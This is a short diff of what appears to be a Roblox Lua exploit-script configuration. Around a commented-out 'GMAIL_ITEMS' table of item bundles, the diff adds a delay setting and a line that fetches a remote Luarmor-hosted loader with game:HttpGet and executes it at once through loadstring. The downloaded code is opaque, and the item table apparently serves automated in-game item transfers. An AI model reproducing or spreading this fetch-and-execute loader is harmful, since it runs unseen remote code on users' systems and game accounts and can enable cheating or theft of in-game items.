@@ -10,3 +10,6 @@ _G.GMAIL_ITEMS = {
 -- ["Potion Bundle"] = {Class = "Misc", Id = "Potion Bundle", Amount = 200},
 -- ["Toy Bundle"] = {Class = "Misc", Id = "Toy Bundle", Amount = 200},
 }
+
+_G.GMAIL_DELAY = 0
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8f386eb537ee7b37a8f0ad37fe6dbc60.lua"))()
